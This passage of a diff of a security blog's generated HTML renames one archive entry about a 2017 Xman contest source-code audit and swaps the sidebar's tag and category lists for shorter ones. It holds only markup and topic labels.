         </li>
     
     
@@ -5306,7 +5334,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/21</span><a class="archive-post-title" href= "/2017/08/21/Xman线下赛源码审计/" >Xman线下赛源码审计</a>
+            <span class="archive-post-date">08/21</span><a class="archive-post-title" href= "/2017/08/21/Xman线下赛源码审计/" >2017 Xman线下赛源码审计</a>
         </li>
     
     
@@ -5493,61 +5521,19 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="writeup"><span class="iconfont-archer">&#xe606;</span>writeup</span>
     
-        <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
-    
-        <span class="sidebar-tag-name" data-tags="Flow-Analysis"><span class="iconfont-archer">&#xe606;</span>Flow-Analysis</span>
+        <span class="sidebar-tag-name" data-tags="crypto"><span class="iconfont-archer">&#xe606;</span>crypto</span>
     
         <span class="sidebar-tag-name" data-tags="misc"><span class="iconfont-archer">&#xe606;</span>misc</span>
     
-        <span class="sidebar-tag-name" data-tags="coding"><span class="iconfont-archer">&#xe606;</span>coding</span>
-    
-        <span class="sidebar-tag-name" data-tags="rsa"><span class="iconfont-archer">&#xe606;</span>rsa</span>
-    
-        <span class="sidebar-tag-name" data-tags="crypto"><span class="iconfont-archer">&#xe606;</span>crypto</span>
-    
-        <span class="sidebar-tag-name" data-tags="awd"><span class="iconfont-archer">&#xe606;</span>awd</span>
-    
-        <span class="sidebar-tag-name" data-tags="study"><span class="iconfont-archer">&#xe606;</span>study</span>
-    
-        <span class="sidebar-tag-name" data-tags="aes"><span class="iconfont-archer">&#xe606;</span>aes</span>
-    
-        <span class="sidebar-tag-name" data-tags="crc32"><span class="iconfont-archer">&#xe606;</span>crc32</span>
-    
-        <span class="sidebar-tag-name" data-tags="bitcon"><span class="iconfont-archer">&#xe606;</span>bitcon</span>
-    
-        <span class="sidebar-tag-name" data-tags="paper"><span class="iconfont-archer">&#xe606;</span>paper</span>
-    
-        <span class="sidebar-tag-name" data-tags="serialize"><span class="iconfont-archer">&#xe606;</span>serialize</span>
-    
-        <span class="sidebar-tag-name" data-tags="other"><span class="iconfont-archer">&#xe606;</span>other</span>
-    
-        <span class="sidebar-tag-name" data-tags="jwt"><span class="iconfont-archer">&#xe606;</span>jwt</span>
-    
-        <span class="sidebar-tag-name" data-tags="flask"><span class="iconfont-archer">&#xe606;</span>flask</span>
-    
-        <span class="sidebar-tag-name" data-tags="sql"><span class="iconfont-archer">&#xe606;</span>sql</span>
-    
-        <span class="sidebar-tag-name" data-tags="soap"><span class="iconfont-archer">&#xe606;</span>soap</span>
-    
-        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
-    
-        <span class="sidebar-tag-name" data-tags="rce"><span class="iconfont-archer">&#xe606;</span>rce</span>
-    
-        <span class="sidebar-tag-name" data-tags="upload"><span class="iconfont-archer">&#xe606;</span>upload</span>
-    
-        <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
-    
-        <span class="sidebar-tag-name" data-tags="cms"><span class="iconfont-archer">&#xe606;</span>cms</span>
-    
-        <span class="sidebar-tag-name" data-tags="xml"><span class="iconfont-archer">&#xe606;</span>xml</span>
-    
-        <span class="sidebar-tag-name" data-tags="redis"><span class="iconfont-archer">&#xe606;</span>redis</span>
-    
-        <span class="sidebar-tag-name" data-tags="des"><span class="iconfont-archer">&#xe606;</span>des</span>
+        <span class="sidebar-tag-name" data-tags="others"><span class="iconfont-archer">&#xe606;</span>others</span>
     
         <span class="sidebar-tag-name" data-tags="cve"><span class="iconfont-archer">&#xe606;</span>cve</span>
     
-        <span class="sidebar-tag-name" data-tags="ecc"><span class="iconfont-archer">&#xe606;</span>ecc</span>
+        <span class="sidebar-tag-name" data-tags="paper"><span class="iconfont-archer">&#xe606;</span>paper</span>
+    
+        <span class="sidebar-tag-name" data-tags="ml"><span class="iconfont-archer">&#xe606;</span>ml</span>
+    
+        <span class="sidebar-tag-name" data-tags="IOT"><span class="iconfont-archer">&#xe606;</span>IOT</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
@@ -5586,19 +5572,13 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="writeup"><span class="iconfont-archer">&#xe60a;</span>writeup</span>
     
-        <span class="sidebar-category-name" data-categories="Flow-Analysis"><span class="iconfont-archer">&#xe60a;</span>Flow-Analysis</span>
-    
         <span class="sidebar-category-name" data-categories="crypto"><span class="iconfont-archer">&#xe60a;</span>crypto</span>
-    
-        <span class="sidebar-category-name" data-categories="study"><span class="iconfont-archer">&#xe60a;</span>study</span>
     
         <span class="sidebar-category-name" data-categories="misc"><span class="iconfont-archer">&#xe60a;</span>misc</span>
     
+        <span class="sidebar-category-name" data-categories="others"><span class="iconfont-archer">&#xe60a;</span>others</span>
+    
         <span class="sidebar-category-name" data-categories="paper"><span class="iconfont-archer">&#xe60a;</span>paper</span>
-    
-        <span class="sidebar-category-name" data-categories="other"><span class="iconfont-archer">&#xe60a;</span>other</span>
-    
-        <span class="sidebar-category-name" data-categories="cms"><span class="iconfont-archer">&#xe60a;</span>cms</span>
     
     </div>
     <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
